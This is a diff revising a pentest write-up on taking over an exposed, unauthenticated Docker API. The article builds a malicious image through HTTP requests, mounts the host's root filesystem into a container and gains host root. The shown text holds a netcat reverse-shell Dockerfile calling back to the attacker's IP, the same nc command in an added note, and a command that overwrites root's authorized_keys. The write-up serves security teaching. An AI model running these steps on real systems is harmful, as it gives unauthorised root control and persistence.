@@ -36,7 +36,7 @@ Initial reconnaissance showed an open port that was apparently serving some sort
 ```http
 HTTP/1.1 404 Not Found
 Server: nginx/1.10.3 (Ubuntu)
-Date: Tue, 03 Oct, 2017 15:52:16 GMT
+Date: Tue, 03 Oct, 2017 15:30:16 GMT
 Content-Type: application/json
 Content-Length: 30
 Connection: Close
@@ -51,16 +51,16 @@ By appending `/info` to the URL of the service to be like this: `http://10.0.5.1
 
 Unfortunately, the Docker API doesn't have a built-in authentication system, but you can implement [TLS certificates](http://tech.paulcz.net/2016/01/secure-docker-with-tls/) to restrict access to the API.
 
-To enumerate the version of the API, we appended `v1.30/info` to the URL and the API explicitly told us its version. v1.30 is the latest version of the API at the time of writing this article, and according to the documentation, you can also query the server's info by submitting a GET request to this URL: `http://10.0.5.10:4000/v1.30/info`
+To enumerate the version of the API, we appended `v1.31/info` to the URL and the API explicitly told us its version. v1.31 is the latest version of the API at the time of writing this article, and according to the documentation, you can also query the server's info by submitting a GET request to this URL: `http://10.0.5.10:4000/v1.31/info`
 ```http
 HTTP/1.1 400 Bad Request
 Server: nginx/1.10.3 (Ubuntu)
-Date: Tue, 03 Oct, 2017 15:52:16 GMT
+Date: Tue, 03 Oct, 2017 15:40:16 GMT
 Content-Type: application/json
 Content-Length: 96
 Connection: Close
 {
-"message":"client is newer than server (client API version: 1.30, server API version: 1.24)"
+"message":"client is newer than server (client API version: 1.31, server API version: 1.24)"
 }
 ```
 
@@ -70,13 +70,18 @@ Connection: Close
 After some quick reading through the [Docker API Documentation](https://docs.docker.com/engine/api/v1.24/), creating a custom image and starting it as a container is simply a matter of a few POST requests.
 
 Since Docker allows us to create an image from a _Dockerfile_ through the UNIX socket, it shouldn't be different if performed through the API, right?
-We begin to craft our own malicious _Dockerfile_ and upload it anywhere on the internet. The Dockerfile I created utilized a clean Ubuntu installation and the good ol' netcat to give us a reverse TCP shell with root access to the container. Our _Dockerfile_ should look like this:
+We begin to craft our own malicious _Dockerfile_ and upload it anywhere on the internet. The Dockerfile I created utilized a clean Ubuntu installation and the good ol' [**netcat**](http://netcat.sourceforge.net/) to give us a reverse TCP shell with root access to the container. Our _Dockerfile_ should look like this:
 
 ```docker
 FROM ubuntu:16.04
+
 RUN apt-get update -y && apt-get install netcat -y
 CMD ["nc", "-n", "My_OWN_IP", "4444", "-e", "/bin/bash"]
 ```
+
+Note
+> CMD is the command that is to executed upon the startup of the container. In our case, it's just like running `nc -n xx.xx.xx.xx 444 -e /bin/bash` in the container system.
+
 
 Afterwards, we start to craft the POST request and the JSON object needed in order to build our image.
 
@@ -105,7 +110,7 @@ Connection: Close
 {"Id":"89a1eeb4c9a48a4d3a7bc300fc0b6164d32f2bd65b84e15ef60954b8bb38125d","Warnings":null}
 ```
 
-We can confirm that our image has been created by going to this URL: `http://10.0.5.10:4000/images/json`. It should be the first one form the top.
+We can confirm that our image has been created by navigating to this URL: `http://10.0.5.10:4000/images/json`. It should be the first one from the top.
 
 Next step is to create a container from this image, and according to the documentation, it could be done using the following request:
 
@@ -127,7 +132,7 @@ Content-Length: 207
 }
 ```
 
-That's where the magic happens. Assuming that the user which is running the docker daemon is privileged and able to view and edit all files on the host system, we simply _map_ or _bind_ the root's directory to a directory create inside the container itself. Theoritically, we should be able to browse the **HOST**'s file system `/` from inside the container by navigating into `/root/hostroot/`.
+That's where the magic happens. Assuming that the user which is running the docker daemon is privileged and able to view and edit all files on the host system, we simply _map_ or _bind_ the root's directory to a directory create inside the container itself. Theoritically, we should be able to browse the **HOST**'s file system `/` from inside the **CONTAINER** by navigating into `/root/hostroot/` in the container system.
 
 In case of a successful container creation, the server's response will look like this:
 ```http
@@ -159,7 +164,7 @@ Content-Type: application/json
 Content-Length: 2
 {}
 ```
-Make sure that you set up a netcat listener to receive the reverse TCP connection before starting the container.
+Make sure that you set up a [netcat](http://netcat.sourceforge.net/) listener on your server to receive the reverse TCP connection before starting the container.
 
 A success response will typically look like the following:
 ```http
@@ -173,12 +178,12 @@ And we should be receiving a new connection with a root reverse shell. Hurraaay!
 <img src="https://github.com/fusionx3/fusionx3.github.io/blob/master/images/docker_2.png?raw=true" width="800" height="200" />
 
 
-**Don't do the "root dance" just yet, because we're still confined to the container.**
+**Don't do the "root dance" just yet, as we're still confined to the container.**
 
 <br>
 ## **Escalating to the Host's Root**
 
-Now, to the fun part! As mentioned above, we _mapped_ the host's root directory to a directory inside the container, which we called "hostroot". So, by simply nagivating to this directory, we are able to view the entire filesystem of the **host**.
+Now, to the fun part! As mentioned above, we _mapped_ the host's root directory to a directory inside the container, which we called "hostroot". So, by simply nagivating to this directory, we are able to view and edit the entire filesystem of the **host**.
 
 `cd /root/hostroot`
 
@@ -186,7 +191,7 @@ For more convenience and to avoid getting confused and accidentally browse files
 
 `chroot /root/hostroot`
 
-Another mistake made by the system administration was allowing root login via SSH to the host. How did we know this? through the `sshd_config` file of course!
+Another mistake made by the system administration was allowing root login via SSH to the host. How do we know this? from the `/etc/ssh/sshd_config` file of course!
 
 Anyhow, to be able to login as root, you can do one of two things(among many other things):
 
@@ -196,13 +201,13 @@ Anyhow, to be able to login as root, you can do one of two things(among many oth
 
 **Note**
 
-> For some reason, you can't write into the file and save, but you can delete it and re-create it. Be careful not to delete existing public keys while pentesting. Save the current keys into a file and restore it in the clean-up phase.
+> For some reason, I couldn't write into the file and save, but I was able to delete it and re-create it. Be careful not to delete existing public keys or any files while pentesting. Save the current keys into a file and restore it in the clean-up phase.
 
 To remove current keys and add your own:
 
 `rm -rf /root/.ssh/authorized_keys && echo "YOUR_PUBLIC_KEY" > /root/.ssh/authorized_keys`
 
-Finally, just run SSH and login using your new password/public key.
+Finally, just run SSH and login as root using your new password/public key.
 
 <br>
 ## **How Could This Have Been Prevented?**
